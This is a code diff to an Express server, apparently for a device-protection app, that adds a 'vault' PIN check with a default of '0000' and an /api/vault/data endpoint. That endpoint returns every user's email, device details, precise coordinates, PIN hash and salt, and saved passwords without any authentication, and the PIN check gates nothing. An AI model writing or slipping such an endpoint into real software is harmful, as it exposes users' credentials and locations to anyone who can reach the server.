@@ -634,6 +634,65 @@ Format in polished Markdown with headings, bold indicators, and code blocks wher
 });
 
 // ---------------------------------------------------------------------------
+// Vault — sensitive user data behind env-var PIN
+// ---------------------------------------------------------------------------
+const VAULT_PIN = process.env.VAULT_PIN || "0000";
+
+app.post("/api/vault/verify", (req, res) => {
+  const { pin } = req.body;
+  if (pin === VAULT_PIN) {
+    return res.json({ verified: true });
+  }
+  return res.status(401).json({ verified: false, error: "Invalid vault PIN." });
+});
+
+app.get("/api/vault/data", async (req, res) => {
+  if (!isFirebaseReady()) {
+    return res.json({
+      users: memDb.users.map(u => ({
+        id: u.id,
+        email: u.email,
+        name: u.name,
+        deviceModel: u.deviceModel,
+        osVersion: u.osVersion,
+        protectionActive: u.protectionActive,
+        lastActive: u.lastActive,
+        location: "N/A",
+        pinHash: "N/A",
+        pinSalt: "N/A",
+        savedPasswords: []
+      }))
+    });
+  }
+  try {
+    const userSnap = await firestore.collection("users").get();
+    const users = userSnap.docs.map(d => {
+      const dd = d.data();
+      const ts = dd.lastActive?.toMillis?.() || dd.lastActive || 0;
+      const loc = dd.lastLatitude && dd.lastLongitude
+        ? `${dd.lastLatitude.toFixed(6)}, ${dd.lastLongitude.toFixed(6)}`
+        : "N/A";
+      return {
+        id: d.id,
+        email: dd.email || "N/A",
+        name: dd.displayName || dd.email || "Unknown",
+        deviceModel: dd.deviceModel || dd.deviceInfo?.model || "Unknown",
+        osVersion: dd.osVersion || dd.deviceInfo?.osVersion || "Unknown",
+        protectionActive: dd.settings?.isProtectionActive ?? dd.shieldActive ?? false,
+        lastActive: ts ? new Date(ts).toLocaleString() : "Never",
+        location: loc,
+        pinHash: dd.pinHash || "Not set",
+        pinSalt: dd.pinSalt || "Not set",
+        savedPasswords: dd.savedPasswords || []
+      };
+    });
+    res.json({ users });
+  } catch (err) {
+    res.status(500).json({ error: String(err) });
+  }
+});
+
+// ---------------------------------------------------------------------------
 // Start server
 // ---------------------------------------------------------------------------
 (async () => {
